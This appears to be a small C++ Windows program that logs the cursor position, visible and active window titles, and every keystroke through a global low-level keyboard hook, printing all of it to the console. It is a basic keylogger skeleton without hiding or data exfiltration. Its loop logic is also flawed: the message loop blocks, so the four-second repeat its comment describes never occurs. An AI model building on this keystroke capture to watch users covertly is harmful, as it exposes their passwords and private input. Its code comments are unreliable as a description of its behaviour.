#include <windows.h>
#include <iostream>
#include <vector>

using namespace std;

// Function to get the cursor location
void GetCursorLocation() {
    POINT cursorPos;
    if (GetCursorPos(&cursorPos)) {
        cout << "Cursor Location: X = " << cursorPos.x << ", Y = " << cursorPos.y << endl;
    }
}

// Function to list all open windows
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    if (IsWindowVisible(hwnd)) {
        char windowTitle[256];
        GetWindowTextA(hwnd, windowTitle, sizeof(windowTitle));
        if (strlen(windowTitle) > 0) {
            cout << "Window Title: " << windowTitle << endl;
            vector<HWND>* windows = reinterpret_cast<vector<HWND>*>(lParam);
            windows->push_back(hwnd);
        }
    }
    return TRUE;
}

void ListOpenWindows() {
    vector<HWND> windows;
    EnumWindows(EnumWindowsProc, reinterpret_cast<LPARAM>(&windows));
}

// Function to get the active window
void GetActiveWindowInfo() {
    HWND activeWindow = GetForegroundWindow();
    char windowTitle[256];
    GetWindowTextA(activeWindow, windowTitle, sizeof(windowTitle));
    cout << "Active Window: " << windowTitle << endl;
}

// Function to capture keyboard input
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* keyboardData = (KBDLLHOOKSTRUCT*)lParam;
            char key = MapVirtualKey(keyboardData->vkCode, 0);
            cout << "Keyboard Input: " << key << endl;
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    while (true) {
        // Get cursor location
        GetCursorLocation();

        // List open windows
        ListOpenWindows();

        // Get the active window
        GetActiveWindowInfo();

        // Set up keyboard input capture
        HHOOK keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

        if (keyboardHook == NULL) {
            cerr << "Failed to set up keyboard hook." << endl;
            return 1;
        }

        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0)) {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }

        UnhookWindowsHookEx(keyboardHook);

        // Sleep for 4 seconds before retrieving information again
        Sleep(4000); // Sleep for 4 seconds
    }

    return 0;
}
